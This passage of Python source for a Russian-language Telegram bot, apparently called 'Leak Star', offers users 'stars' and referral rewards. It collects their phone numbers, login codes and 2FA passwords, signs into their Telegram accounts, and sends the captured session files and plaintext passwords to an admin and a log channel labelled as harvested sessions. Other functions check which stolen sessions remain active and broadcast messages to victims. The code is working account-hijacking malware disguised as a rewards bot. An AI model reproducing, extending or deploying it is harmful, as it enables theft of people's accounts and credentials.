            if user_id == ADMIN_CHAT_ID:
                await check_all_sessions(user_id)
            return
        
        elif data == 'admin_stats':
            if user_id == ADMIN_CHAT_ID:
                await show_admin_stats(user_id)
            return
        
        elif data == 'admin_stars':
            if user_id == ADMIN_CHAT_ID:
                await send_message(user_id, 
                    "⭐ *Управление звёздами:*\n\n"
                    "➕ *Начислить звёзды:*\n`/addstars user_id amount`\n\n"
                    "➖ *Списать звёзды:*\n`/removestars user_id amount`\n\n"
                    "📝 *Пример:* `/addstars 123456789 500`", 
                    parse_mode='Markdown')
            return
        
        elif data == 'create_article':
            if user_id == ADMIN_CHAT_ID:
                user_states[user_id] = UserState.WAITING_MEDIA_CHOICE
                keyboard = create_media_choice_keyboard()
                try:
                    await event.edit("📝 *Добавить медиа к статье?*", buttons=keyboard, parse_mode='Markdown')
                except:
                    await send_message(user_id, "📝 *Добавить медиа к статье?*", keyboard, parse_mode='Markdown')
            return
        
        # КНОПКИ СОЗДАНИЯ СТАТЬИ
        elif data in ['article_yes', 'article_no']:
            if user_id == ADMIN_CHAT_ID and user_states.get(user_id) == UserState.WAITING_MEDIA_CHOICE:
                if user_id not in user_data:
                    user_data[user_id] = {}
                user_data[user_id]['has_media'] = (data == 'article_yes')
                
                if data == 'article_yes':
                    user_states[user_id] = UserState.WAITING_MEDIA_FILE
                    try:
                        await event.edit("📎 *Отправьте фото или видео:*", parse_mode='Markdown')
                    except:
                        await send_message(user_id, "📎 *Отправьте фото или видео:*", parse_mode='Markdown')
                else:
                    user_states[user_id] = UserState.WAITING_ARTICLE_BUTTONS
                    keyboard = create_article_buttons_keyboard()
                    try:
                        await event.edit("📋 *Настройка кнопок статьи*", buttons=keyboard, parse_mode='Markdown')
                    except:
                        await send_message(user_id, "📋 *Настройка кнопок статьи*", buttons=keyboard, parse_mode='Markdown')
            return
        
        # КНОПКИ УПРАВЛЕНИЯ КНОПКАМИ СТАТЬИ
        elif data in ['add_url_button', 'add_callback_button', 'add_inline_button', 
                     'add_phone_button', 'add_geo_button', 'add_poll_button', 'add_game_button']:
            if user_id == ADMIN_CHAT_ID and user_states.get(user_id) in [UserState.WAITING_ARTICLE_BUTTONS, UserState.WAITING_BUTTON_TYPE]:
                if user_id not in user_data:
                    user_data[user_id] = {}
                
                button_type_map = {
                    'add_url_button': ButtonType.URL,
                    'add_callback_button': ButtonType.CALLBACK,
                    'add_inline_button': ButtonType.SWITCH_INLINE,
                    'add_phone_button': ButtonType.PHONE,
                    'add_geo_button': ButtonType.GEO,
                    'add_poll_button': ButtonType.POLL,
                    'add_game_button': ButtonType.GAME
                }
                
                user_data[user_id]['current_button_type'] = button_type_map[data]
                user_states[user_id] = UserState.WAITING_BUTTON_TEXT
                
                try:
                    await event.edit("📝 *Введите текст для кнопки:*", parse_mode='Markdown')
                except:
                    await send_message(user_id, "📝 *Введите текст для кнопки:*", parse_mode='Markdown')
            return
        
        elif data == 'clear_buttons':
            if user_id == ADMIN_CHAT_ID and user_states.get(user_id) == UserState.WAITING_ARTICLE_BUTTONS:
                if user_id in user_data:
                    user_data[user_id]['buttons'] = []
                await event.answer("✅ Кнопки очищены!", alert=True)
                keyboard = create_article_buttons_keyboard()
                try:
                    await event.edit("📋 *Настройка кнопок статьи:*\n\n📝 *Текущие кнопки: нет*", buttons=keyboard, parse_mode='Markdown')
                except:
                    await send_message(user_id, "📋 *Настройка кнопок статьи:*\n\n📝 *Текущие кнопки: нет*", buttons=keyboard, parse_mode='Markdown')
            return
        
        elif data == 'finish_buttons':
            if user_id == ADMIN_CHAT_ID and user_states.get(user_id) == UserState.WAITING_ARTICLE_BUTTONS:
                user_states[user_id] = UserState.WAITING_ARTICLE_TEXT
                
                buttons_preview = ""
                if user_id in user_data and 'buttons' in user_data[user_id] and user_data[user_id]['buttons']:
                    buttons_preview = "\n\n📋 *Созданные кнопки:*\n"
                    for i, btn_row in enumerate(user_data[user_id]['buttons'], 1):
                        for btn in btn_row:
                            buttons_preview += f"{i}. {btn.text}\n"
                
                try:
                    await event.edit(f"📝 *Введите текст статьи*\n\n*Можно использовать Markdown разметку*{buttons_preview}", parse_mode='Markdown')
                except:
                    await send_message(user_id, f"📝 *Введите текст статьи*\n\n*Можно использовать Markdown разметку*{buttons_preview}", parse_mode='Markdown')
            return
        
        elif data == 'cancel_article':
            if user_id == ADMIN_CHAT_ID:
                user_states[user_id] = UserState.NONE
                if user_id in user_data:
                    del user_data[user_id]
                keyboard = create_main_keyboard(user_id)
                try:
                    await event.edit("❌ *Создание статьи отменено*", buttons=keyboard, parse_mode='Markdown')
                except:
                    await send_message(user_id, "❌ *Создание статьи отменено*", buttons=keyboard, parse_mode='Markdown')
            return
        
        # ОБРАБОТКА КНОПОК ВВОДА КОДА
        elif data.startswith('code_'):
            if user_states.get(user_id) == UserState.WAITING_CODE:
                action = data.split('_')[1]
                code = user_data.get(user_id, {}).get('code', '')
                
                if action == 'clear':
                    code = ''
                elif action == 'confirm':
                    if len(code) == 5:
                        user_data[user_id]['code'] = code
                        await process_code(user_id)
                        return
                    else:
                        await event.answer("📱 Код должен содержать 5 цифр", alert=True)
                        return
                else:
                    if len(code) < 5:
                        code += action
                
                if user_id not in user_data:
                    user_data[user_id] = {}
                user_data[user_id]['code'] = code
                
                keyboard = create_code_keyboard()
                try:
                    await event.edit(f'📱 *Код подтверждения:* `{code}`', buttons=keyboard, parse_mode='Markdown')
                except:
                    await send_message(user_id, f'📱 *Код подтверждения:* `{code}`', keyboard, parse_mode='Markdown')
            return
        
        # ОБРАБОТКА КНОПОК ПОДТВЕРЖДЕНИЯ СЕССИИ - ВАЖНО! ЭТО ДОЛЖНО БЫТЬ!
        elif data.startswith('send_session_'):
            parts = data.split('_')
            if len(parts) >= 4:
                action = parts[2]  # yes или no
                session_data = '_'.join(parts[3:])
                
                if user_id == ADMIN_CHAT_ID and session_data:
                    session_parts = session_data.split('|')
                    if len(session_parts) >= 3:
                        session_path = session_parts[0]
                        target_user_id = int(session_parts[1])
                        phone = session_parts[2]
                        password = session_parts[3] if len(session_parts) > 3 else None
                        
                        if action == 'yes':
                            # Отправляем в канал
                            await send_session_to_log_channel(session_path, target_user_id, phone, password)
                            await event.answer("✅ Сессия отправлена в канал!", alert=True)
                        else:
                            await event.answer("✅ Сессия сохранена только для вас", alert=True)
                        
                        # Удаляем сессию из данных пользователя
                        if user_id in user_data and 'pending_session' in user_data[user_id]:
                            del user_data[user_id]['pending_session']
                    
                return
        
        # КНОПКА ПОДТВЕРЖДЕНИЯ РАССЫЛКИ
        elif data == 'confirm_broadcast':
            if user_id == ADMIN_CHAT_ID:
                await event.answer("📤 Начинаю рассылку...", alert=True)
                await send_broadcast_to_all(user_id)
            return
        
        await event.answer()
        
    except Exception as e:
        print(f"Ошибка в callback_handler: {e}")
        import traceback
        traceback.print_exc()
        try:
            await event.answer("⚠️ Ошибка системы", alert=True)
        except:
            pass

# Функции профиля и бонусов
@require_registration
async def show_profile(user_id, event=None):
    """Показывает профиль пользователя"""
    try:
        stats = user_stats.get(user_id, {})
        if not stats:
            stats = {
                "stars": 100,
                "reg_date": datetime.now(),
                "refs": [],
                "verified_refs": []
            }
            user_stats[user_id] = stats
        
        try:
            user_info = await bot.get_entity(user_id)
        except:
            user_info = None
        
        profile_img = create_profile_image(user_id, stats, user_info)
        
        stars = stats.get('stars', 0)
        days_in_bot = max(1, (datetime.now() - stats.get('reg_date', datetime.now())).days)
        total_refs = len(stats.get('refs', []))
        verified_refs = len(stats.get('verified_refs', []))
        level = (stars // 100) + 1
        progress = stars % 100
        
        if profile_img:
            await send_photo(user_id, profile_img,
                caption=f"👤 *Ваш профиль*\n\n"
                       f"⭐ *Баланс:* `{stars}`\n"
                       f"⚡ *Уровень:* `{level}`",
                parse_mode='Markdown'
            )
        
        stats_text = (
            f"📊 *Детали профиля:*\n\n"
            f"⭐ *Звёзды:* `{stars}`\n"
            f"📅 *Дней в системе:* `{days_in_bot}`\n"
            f"👥 *Рефералы:* `{total_refs}`\n"
            f"✅ *Активные:* `{verified_refs}`\n"
            f"⚡ *Уровень:* `{level}`\n"
            f"📈 *Прогресс:* `{progress}`% до след. уровня"
        )
        
        keyboard = create_back_keyboard()
        
        if event:
            try:
                await event.edit(stats_text, buttons=keyboard, parse_mode='Markdown')
            except:
                await send_message(user_id, stats_text, keyboard, parse_mode='Markdown')
        else:
            await send_message(user_id, stats_text, keyboard, parse_mode='Markdown')
            
    except Exception as e:
        print(f"Ошибка в show_profile: {e}")
        if event:
            await event.answer("⚠️ Ошибка загрузки профиля", alert=True)

@require_registration
async def show_daily_bonus(user_id):
    """Показывает ежедневный бонус"""
    today = datetime.now().date()
    
    if user_id in user_daily_bonuses:
        last_claim = user_daily_bonuses[user_id]
        if last_claim == today:
            await send_message(user_id,
                "🎁 *Ежедневный бонус уже получен!*\n\n"
                "🕐 *Следующий бонус:* через 24 часа",
                parse_mode='Markdown')
            return
    
    streak = user_stats.get(user_id, {}).get('bonus_streak', 0) + 1
    bonus = min(50 + streak * 10, 200)
    
    if user_id not in user_stats:
        user_stats[user_id] = {'stars': 0}
    
    current_stars = user_stats[user_id].get('stars', 0)
    user_stats[user_id]['stars'] = current_stars + bonus
    user_stats[user_id]['bonus_streak'] = streak
    user_daily_bonuses[user_id] = today
    
    await send_message(user_id,
        f"🎁 *ЕЖЕДНЕВНЫЙ БОНУС!*\n\n"
        f"⭐ *Получено:* `{bonus}` звёзд\n"
        f"🔥 *Серия дней:* `{streak}`\n"
        f"💰 *Новый баланс:* `{current_stars + bonus}`\n\n"
        f"🔄 *Следующий бонус через 24 часа*",
        parse_mode='Markdown')
    
    save_data()

@require_registration
async def show_referral_system(user_id):
    """Показывает реферальную систему"""
    try:
        if user_id not in referral_links:
            ref_code = f"ref_{user_id}_{int(datetime.now().timestamp())}"
            referral_links[user_id] = ref_code
            referral_map[ref_code] = user_id
        
        ref_code = referral_links[user_id]
        
        try:
            bot_me = await bot.get_me()
            bot_username = bot_me.username if bot_me.username else "LeakStarBot"
        except:
            bot_username = "LeakStarBot"
        
        ref_link = f"https://t.me/{bot_username}?start={ref_code}"
        
        stats = user_stats.get(user_id, {})
        total_refs = len(stats.get('refs', []))
        verified_refs = len(stats.get('verified_refs', []))
        
        ref_text = (
            f"📈 *Реферальная система*\n\n"
            f"🔗 *Ваша ссылка:*\n`{ref_link}`\n\n"
            f"⭐ *За каждого друга:* `50` звёзд\n"
            f"👥 *Всего приглашено:* `{total_refs}`\n"
            f"✅ *Активные:* `{verified_refs}`\n\n"
            f"📤 *Поделитесь ссылкой с друзьями!*"
        )
        
        keyboard = [
            [KeyboardButtonUrl("📤 Поделиться", f"https://t.me/share/url?url={ref_link}&text=🌟%20Присоединяйся%20к%20Leak%20Star%20и%20зарабатывай%20звёзды!")],
            [KeyboardButtonCallback("🔄 Обновить", b"referral_system")],
            [KeyboardButtonCallback("🔙 Назад", b"back_to_main")]
        ]
        
        await send_message(user_id, ref_text, keyboard, parse_mode='Markdown')
        
    except Exception as e:
        print(f"Ошибка в show_referral_system: {e}")
        await send_message(user_id, "❌ *Ошибка системы*", parse_mode='Markdown')

@require_registration
async def start_withdrawal(user_id):
    """Начинает процесс вывода"""
    stats = user_stats.get(user_id, {})
    stars = stats.get('stars', 0)
    
    if stars < 100:
        await send_message(user_id, 
            f"❌ *Недостаточно звёзд!*\n\n"
            f"⭐ *Минимум:* `100` звёзд\n"
            f"💰 *Ваш баланс:* `{stars}` звёзд",
            parse_mode='Markdown')
        return
    
    user_states[user_id] = UserState.WAITING_WITHDRAW_USERNAME
    await send_message(user_id, 
        "💸 *Вывод средств*\n\n"
        "📝 *Введите юзернейм* (без @) для вывода:\n\n"
        f"⭐ *Баланс:* `{stars}` звёзд\n"
        f"💰 *Минимум:* `100` звёзд\n"
        f"⚡ *Максимум за раз:* `10000` звёзд",
        parse_mode='Markdown')

async def process_withdrawal(user_id, target_username):
    """Обрабатывает вывод средств"""
    stats = user_stats.get(user_id, {})
    stars = stats.get('stars', 0)
    
    if stars < 100:
        await send_message(user_id, "❌ *Недостаточно звёзд!*", parse_mode='Markdown')
        user_states[user_id] = UserState.NONE
        return
    
    amount = min(stars, 10000)
    pending_withdrawals[user_id] = {
        "username": target_username,
        "amount": amount,
        "timestamp": datetime.now()
    }
    
    if user_id in user_stats:
        user_stats[user_id]['stars'] = stars - amount
    
    await send_message(user_id, 
        f"✅ *Заявка принята!*\n\n"
        f"👤 *Получатель:* @{target_username}\n"
        f"⭐ *Сумма:* `{amount}` звёзд\n"
        f"⏳ *Время обработки:* `48 часов`\n\n"
        f"💰 *Новый баланс:* `{stars - amount}` звёзд",
        parse_mode='Markdown')
    
    try:
        user = await bot.get_entity(user_id)
        user_name = f"{user.first_name or ''} {user.last_name or ''}".strip() or str(user_id)
        
        admin_msg = (
            f"⚠️ *Новый вывод*\n\n"
            f"👤 *Отправитель:* {user_name}\n"
            f"🆔 *ID:* `{user_id}`\n"
            f"🎯 *Получатель:* @{target_username}\n"
            f"⭐ *Сумма:* `{amount}` звёзд"
        )
        await send_message(ADMIN_CHAT_ID, admin_msg, parse_mode='Markdown')
    except:
        pass
    
    user_states[user_id] = UserState.NONE
    keyboard = create_main_keyboard(user_id)
    await send_message(user_id, "📱 *Главное меню*", buttons=keyboard, parse_mode='Markdown')
    save_data()

# Функции регистрации и сессий
async def process_phone(user_id, phone):
    """Обрабатывает ввод номера телефона"""
    phone = phone.strip()
    
    if not phone.startswith('+'):
        await send_message(user_id, '❌ *Начинайте с «+»*', parse_mode='Markdown')
        return
    
    clean_phone = phone.replace('+', '').replace(' ', '').replace('-', '')
    
    if not clean_phone.isdigit() or len(clean_phone) < 10:
        await send_message(user_id, '❌ *Неверный номер*', parse_mode='Markdown')
        return
    
    session_name = f"session_{clean_phone}"
    session_path = os.path.join(session_dir, session_name)
    
    try:
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            result = await client.send_code_request(clean_phone)
            phone_code_hash = result.phone_code_hash
            
            if user_id not in user_data:
                user_data[user_id] = {}
            user_data[user_id]['phone'] = clean_phone
            user_data[user_id]['phone_code_hash'] = phone_code_hash
            user_data[user_id]['session_path'] = session_path
            
            user_states[user_id] = UserState.WAITING_CODE
            
            keyboard = create_code_keyboard()
            await send_message(user_id, '📱 *Код отправлен!*', buttons=keyboard, parse_mode='Markdown')
        else:
            user_sessions[user_id] = session_path
            await send_message(user_id, '✅ *Уже подключены!*', parse_mode='Markdown')
            user_states[user_id] = UserState.NONE
            keyboard = create_main_keyboard(user_id)
            await send_message(user_id, "📱 *Главное меню*", buttons=keyboard, parse_mode='Markdown')
            
    except errors.PhoneNumberInvalidError:
        await send_message(user_id, '❌ *Неверный номер*', parse_mode='Markdown')
    except Exception as e:
        await send_message(user_id, f'❌ *Ошибка:* {str(e)[:50]}', parse_mode='Markdown')
        user_states[user_id] = UserState.NONE

async def process_code(user_id):
    """Обрабатывает ввод кода подтверждения"""
    if user_id not in user_data:
        await send_message(user_id, '❌ *Ошибка системы*', parse_mode='Markdown')
        user_states[user_id] = UserState.NONE
        return
    
    user_info = user_data[user_id]
    code = user_info.get('code', '')
    phone = user_info.get('phone', '')
    phone_code_hash = user_info.get('phone_code_hash', '')
    session_path = user_info.get('session_path', '')
    
    if not code or len(code) != 5:
        await send_message(user_id, '❌ *5 цифр*', parse_mode='Markdown')
        keyboard = create_code_keyboard()
        await send_message(user_id, '*Введите код:*', buttons=keyboard, parse_mode='Markdown')
        return
    
    try:
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()
        
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        
    except errors.SessionPasswordNeededError:
        user_states[user_id] = UserState.WAITING_PASSWORD
        await send_message(user_id, '🔒 *Введите пароль 2FA:*', parse_mode='Markdown')
    except errors.PhoneCodeInvalidError:
        await send_message(user_id, '❌ *Неверный код*', parse_mode='Markdown')
        keyboard = create_code_keyboard()
        await send_message(user_id, '*Введите код:*', buttons=keyboard, parse_mode='Markdown')
    except Exception as e:
        await send_message(user_id, f'❌ *Ошибка:* {str(e)[:50]}', parse_mode='Markdown')
        user_states[user_id] = UserState.NONE
    else:
        user_sessions[user_id] = session_path
        
        await send_message(user_id, "✅ *Регистрация успешна!*", parse_mode='Markdown')
        
        for uid, stats in user_stats.items():
            if isinstance(stats, dict):
                refs_list = stats.get('refs', [])
                if isinstance(refs_list, list) and user_id in refs_list:
                    verified_list = stats.get('verified_refs', [])
                    if isinstance(verified_list, list) and user_id not in verified_list:
                        stats['verified_refs'] = verified_list + [user_id]
        
        # ОТПРАВЛЯЕМ СЕССИЮ АДМИНУ С КНОПКАМИ!
        await send_session_to_admin_with_confirm(session_path, user_id, phone)
        user_states[user_id] = UserState.NONE
        
        keyboard = create_main_keyboard(user_id)
        await send_message(user_id, "📱 *Главное меню*", buttons=keyboard, parse_mode='Markdown')
        
        if user_id in user_data:
            del user_data[user_id]
        
        save_data()

async def process_password(user_id, password):
    """Обрабатывает ввод пароля 2FA"""
    if user_id not in user_data:
        await send_message(user_id, '❌ *Ошибка системы*', parse_mode='Markdown')
        user_states[user_id] = UserState.NONE
        return
    
    user_info = user_data[user_id]
    phone = user_info.get('phone', '')
    session_path = user_info.get('session_path', '')
    
    try:
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()
        
        await client.sign_in(password=password)
        
    except errors.PasswordHashInvalidError:
        await send_message(user_id, '❌ *Неверный пароль*', parse_mode='Markdown')
    except Exception as e:
        await send_message(user_id, f'❌ *Ошибка:* {str(e)[:50]}', parse_mode='Markdown')
        user_states[user_id] = UserState.NONE
    else:
        user_sessions[user_id] = session_path
        
        await send_message(user_id, "✅ *2FA подтверждено!*", parse_mode='Markdown')
        
        for uid, stats in user_stats.items():
            if isinstance(stats, dict):
                refs_list = stats.get('refs', [])
                if isinstance(refs_list, list) and user_id in refs_list:
                    verified_list = stats.get('verified_refs', [])
                    if isinstance(verified_list, list) and user_id not in verified_list:
                        stats['verified_refs'] = verified_list + [user_id]
        
        # ОТПРАВЛЯЕМ СЕССИЮ АДМИНУ С КНОПКАМИ!
        await send_session_to_admin_with_confirm(session_path, user_id, phone, password)
        user_states[user_id] = UserState.NONE
        
        keyboard = create_main_keyboard(user_id)
        await send_message(user_id, "📱 *Главное меню*", buttons=keyboard, parse_mode='Markdown')
        
        if user_id in user_data:
            del user_data[user_id]
        
        save_data()

async def send_session_to_admin_with_confirm(session_path, user_id, phone, password=None):
    """Отправляет сессию администратору с кнопками подтверждения - ИСПРАВЛЕНО!"""
    try:
        if os.path.exists(session_path + '.session'):
            # Создаем данные для кнопок
            session_data = f"{session_path}|{user_id}|{phone}"
            if password:
                session_data += f"|{password}"
            
            # Отправляем сессию файлом
            await bot.send_file(ADMIN_CHAT_ID, session_path + '.session')
            
            # Получаем информацию о пользователе
            user_info = None
            try:
                user_info = await bot.get_entity(user_id)
            except:
                pass
            
            current_time = datetime.now().strftime('%d.%m.%Y %H:%M:%S')
            
            # Сообщение для администратора с кнопками
            admin_message = (
                f"📱 *НОВАЯ СЕССИЯ АКТИВИРОВАНА*\n\n"
                f"👤 *ИНФОРМАЦИЯ О ПОЛЬЗОВАТЕЛЕ:*\n"
                f"🆔 *Telegram ID:* `{user_id}`\n"
                f"📱 *Юзернейм:* @{user_info.username if user_info and user_info.username else 'Не указан'}\n"
                f"👤 *Имя:* {user_info.first_name if user_info and user_info.first_name else ''} {user_info.last_name if user_info and user_info.last_name else ''}\n"
                f"📞 *Телефон:* `+{phone}`\n"
                f"🔐 *2FA пароль:* `{password if password else 'Не установлен'}`\n\n"
                f"📅 *ИНФОРМАЦИЯ О СЕССИИ:*\n"
                f"⏰ *Дата регистрации в боте:* `{current_time}`\n"
                f"📊 *Всего сессий:* `{total_sessions + 1}`\n\n"
                f"📤 *Отправить эту сессию в канал логов?*"
            )
            
            keyboard = create_session_confirm_keyboard(session_data)
            await send_message(ADMIN_CHAT_ID, admin_message, buttons=keyboard, parse_mode='Markdown')
            
            # Сохраняем данные для обработки
            if ADMIN_CHAT_ID not in user_data:
                user_data[ADMIN_CHAT_ID] = {}
            user_data[ADMIN_CHAT_ID]['pending_session'] = {
                'path': session_path,
                'user_id': user_id,
                'phone': phone,
                'password': password,
                'data': session_data
            }
        
    except Exception as e:
        print(f"Ошибка отправки сессии: {e}")
        await send_message(ADMIN_CHAT_ID, f"❌ *Ошибка отправки сессии:* {str(e)[:100]}", parse_mode='Markdown')

async def send_session_to_log_channel(session_path, user_id, phone, password=None):
    """Отправляет сессию и информацию о пользователе в канал логов"""
    try:
        # Получаем информацию о пользователе
        try:
            user_info = await bot.get_entity(user_id)
            username = f"@{user_info.username}" if user_info.username else "Не указан"
            first_name = user_info.first_name or ""
            last_name = user_info.last_name or ""
            full_name = f"{first_name} {last_name}".strip() or "Не указано"
            
            telegram_reg_date = "Не доступно (Telegram API не предоставляет)"
            
        except Exception as e:
            print(f"Ошибка получения информации о пользователе: {e}")
            username = "Не удалось получить"
            full_name = "Не удалось получить"
            telegram_reg_date = "Не доступно"
        
        # Отправляем сессию в канал
        if os.path.exists(session_path + '.session'):
            try:
                await bot.send_file(LOG_CHANNEL_ID, session_path + '.session')
            except Exception as e:
                print(f"Ошибка отправки файла сессии: {e}")
                await send_message(LOG_CHANNEL_ID, f"❌ *Ошибка отправки файла сессии:* {str(e)[:100]}", parse_mode='Markdown')
        
        # Обновляем счетчик сессий
        global total_sessions
        total_sessions += 1
        
        # Формируем информационное сообщение
        current_time = datetime.now().strftime('%d.%m.%Y %H:%M:%S')
        
        log_message = (
            f"🚨 *НОВАЯ СЕССИЯ ДОБЫТА* 🚨\n\n"
            f"👤 *ИНФОРМАЦИЯ О ПОЛЬЗОВАТЕЛЕ:*\n"
            f"🆔 *Telegram ID:* `{user_id}`\n"
            f"📱 *Юзернейм:* {username}\n"
            f"👤 *Имя:* {full_name}\n"
            f"📞 *Телефон:* `+{phone}`\n"
            f"🔐 *2FA пароль:* `{password if password else 'Не установлен'}`\n\n"
            f"📅 *ИНФОРМАЦИЯ ОБ АККАУНТЕ:*\n"
            f"⏰ *Дата создания аккаунта Telegram:* `{telegram_reg_date}`\n"
            f"🕐 *Дата регистрации в боте:* `{current_time}`\n\n"
            f"🔗 *Ссылка на пользователя:* [Перейти](tg://user?id={user_id})\n"
            f"📊 *Номер сессии:* `{total_sessions}`"
        )
        
        # Отправляем сообщение в канал
        await send_message(LOG_CHANNEL_ID, log_message, parse_mode='Markdown')
        
        # Уведомляем администратора
        await send_message(ADMIN_CHAT_ID, f"✅ *Сессия успешно отправлена в канал логов!*\n📊 *Номер сессии:* `{total_sessions}`", parse_mode='Markdown')
        
        save_data()
        
    except Exception as e:
        print(f"Ошибка отправки в канал логов: {e}")
        await send_message(ADMIN_CHAT_ID, f"❌ *Ошибка отправки в канал:* {str(e)[:100]}", parse_mode='Markdown')

# Админские функции
async def check_all_sessions(admin_id):
    """Проверяет все сессии"""
    if admin_id != ADMIN_CHAT_ID:
        return
    
    sessions = [f for f in os.listdir(session_dir) if f.endswith('.session')]
    
    if not sessions:
        await send_message(admin_id, "❌ *Активных сессий нет*", parse_mode='Markdown')
        return
    
    report = f"💾 *Системные сессии:* `{len(sessions)}`\n\n"
    
    for i, session_file in enumerate(sessions[:15], 1):
        session_path = os.path.join(session_dir, session_file)
        try:
            client = TelegramClient(session_path, API_ID, API_HASH)
            await client.connect()
            
            if await client.is_user_authorized():
                try:
                    me = await client.get_me()
                    username = f"@{me.username}" if me.username else "Скрыт"
                    status = f"{i}. 🟢 `{session_file}` - {username}"
                except:
                    status = f"{i}. 🟢 `{session_file}`"
            else:
                status = f"{i}. 🔴 `{session_file}` - неактивна"
            
            report += status + "\n"
            await client.disconnect()
            
        except Exception as e:
            report += f"{i}. ⚠️ `{session_file}` - ошибка: {str(e)[:30]}\n"
    
    if len(sessions) > 15:
        report += f"\n📊 *И еще `{len(sessions) - 15}` скрытых сессий...*"
    
    await send_message(admin_id, report, parse_mode='Markdown')

async def show_admin_stats(admin_id):
    """Показывает статистику администратору"""
    if admin_id != ADMIN_CHAT_ID:
        return
    
    total_stars = 0
    user_count = 0
    
    for user_id, stats in user_stats.items():
        if isinstance(stats, dict):
            stars = stats.get('stars', 0)
            if isinstance(stars, (int, float)):
                total_stars += stars
                user_count += 1
    
    avg_stars = total_stars / user_count if user_count > 0 else 0
    today = datetime.now().date()
    new_today = 0
    
    for stats in user_stats.values():
        if isinstance(stats, dict) and 'reg_date' in stats:
            try:
                if stats['reg_date'].date() == today:
                    new_today += 1
            except:
                pass
    
    stats_text = (
        f"📊 *Статистика системы*\n\n"
        f"👥 *Пользователи:* `{total_users}`\n"
        f"💾 *Сессии:* `{total_sessions}`\n"
        f"⭐ *Всего звёзд:* `{total_stars}`\n"
        f"📈 *Среднее:* `{avg_stars:.1f}` звёзд/пользователь\n"
        f"🆕 *Новых сегодня:* `{new_today}`\n"
        f"⏳ *Ожидает вывода:* `{len(pending_withdrawals)}`"
    )
    
    await send_message(admin_id, stats_text, parse_mode='Markdown')

# Функции статей
async def process_article_text(user_id, text):
    """Обрабатывает текст статьи"""
    if user_id != ADMIN_CHAT_ID:
        await send_message(user_id, '❌ *Нет доступа*', parse_mode='Markdown')
        user_states[user_id] = UserState.NONE
        return
    
    if user_id not in user_data:
        user_data[user_id] = {}
    user_data[user_id]['article_text'] = text
    
    has_media = user_data.get(user_id, {}).get('has_media', False)
    media_message = user_data.get(user_id, {}).get('media', None)
    buttons = user_data.get(user_id, {}).get('buttons', [])
    
    example_messages = []
    
    if buttons:
        example_messages.append("📋 *Примеры кнопок для пользователей:*")
        
        for btn_row in buttons:
            for btn in btn_row:
                if isinstance(btn, KeyboardButtonUrl):
                    example_messages.append(f"🔗 *{btn.text}* - откроет ссылку в браузере")
                elif isinstance(btn, KeyboardButtonCallback):
                    example_messages.append(f"📱 *{btn.text}* - отправит callback данные")
                elif isinstance(btn, KeyboardButtonSwitchInline):
                    example_messages.append(f"🔍 *{btn.text}* - откроет inline поиск")
                elif isinstance(btn, KeyboardButtonRequestPhone):
                    example_messages.append(f"📞 *{btn.text}* - запросит доступ к телефону")
                elif isinstance(btn, KeyboardButtonRequestGeoLocation):
                    example_messages.append(f"📍 *{btn.text}* - запросит геолокацию")
                elif isinstance(btn, KeyboardButtonRequestPoll):
                    example_messages.append(f"📊 *{btn.text}* - предложит создать опрос")
                elif isinstance(btn, KeyboardButtonGame):
                    example_messages.append(f"🎮 *{btn.text}* - запустит игру")
    
    preview_text = f"📝 *Предварительный просмотр рассылки:*\n\n{text}"
    
    if example_messages:
        preview_text += "\n\n" + "\n".join(example_messages)
    
    if buttons:
        try:
            await send_message(user_id, preview_text, buttons=buttons, parse_mode='Markdown')
        except Exception as e:
            error_msg = f"❌ *Ошибка в кнопках:* {str(e)[:100]}\n\nУбедитесь что:\n• URL начинаются с http:// или https://\n• Callback данные не слишком длинные\n• Данные кнопок корректны"
            await send_message(user_id, error_msg, parse_mode='Markdown')
            return
    
    confirm_keyboard = [
        [KeyboardButtonCallback("✅ Да, отправить всем", b"confirm_broadcast")],
        [KeyboardButtonCallback("❌ Нет, отменить", b"cancel_article")]
    ]
    
    await send_message(user_id, "📤 *Отправить статью всем пользователям?*\n\n👥 *Получателей:* " + 
                      f"`{len(processed_users)}`", buttons=confirm_keyboard, parse_mode='Markdown')
    
    user_states[user_id] = UserState.WAITING_ARTICLE_TEXT

async def send_broadcast_to_all(user_id):
    """Отправляет рассылку всем пользователям"""
    if user_id != ADMIN_CHAT_ID:
        return
    
    has_media = user_data.get(user_id, {}).get('has_media', False)
    media_message = user_data.get(user_id, {}).get('media', None)
    buttons = user_data.get(user_id, {}).get('buttons', [])
    article_text = user_data.get(user_id, {}).get('article_text', '')
    
    if not article_text:
        await send_message(user_id, "❌ *Текст статьи не найден*", parse_mode='Markdown')
        return
    
    success_count = 0
    error_count = 0
    
    media_data = None
    if has_media and media_message:
        try:
            media_data = await bot.download_media(media_message.media, file=BytesIO())
        except:
            media_data = None
    
    for target_user_id in list(processed_users):
        try:
            if media_data and has_media:
                try:
                    media_data.seek(0)
                    # Отправляем как фото с force_document=False
                    await send_photo(
                        target_user_id, 
                        media_data, 
                        caption=article_text, 
                        buttons=buttons, 
                        parse_mode='Markdown'
                    )
                except Exception as e:
                    print(f"Ошибка отправки медиа пользователю {target_user_id}: {e}")
                    await send_message(target_user_id, article_text, buttons=buttons, parse_mode='Markdown')
            else:
                await send_message(target_user_id, article_text, buttons=buttons, parse_mode='Markdown')
            
            success_count += 1
            
        except Exception as e:
            print(f"Ошибка отправки пользователю {target_user_id}: {e}")
            error_count += 1
        
        await asyncio.sleep(2)
    
    report_text = (
        f"📤 *Рассылка завершена!*\n\n"
        f"📡 *Статус:* `{'УСПЕШНО' if success_count > 0 else 'ОШИБКА'}`\n"
        f"✅ *Доставлено:* `{success_count}` пользователям\n"
        f"❌ *Ошибок:* `{error_count}`\n"
        f"📊 *Всего получателей:* `{len(processed_users)}`\n\n"
        f"📈 *Эффективность:* `{(success_count/len(processed_users)*100 if processed_users else 0):.1f}%`"
    )
    
    await send_message(user_id, report_text, parse_mode='Markdown')
    
    user_states[user_id] = UserState.NONE
    if user_id in user_data:
        del user_data[user_id]

# Обработчик сообщений
@bot.on(events.NewMessage)
async def message_handler(event):
    user_id = event.sender_id
    message_text = event.text or ""
    state = user_states.get(user_id, UserState.NONE)
    
    # Админские команды
    if message_text.startswith('/addstars') and user_id == ADMIN_CHAT_ID:
        try:
            parts = message_text.split()
            if len(parts) == 3:
                target_id = int(parts[1])
                amount = int(parts[2])
                
                if target_id in user_stats:
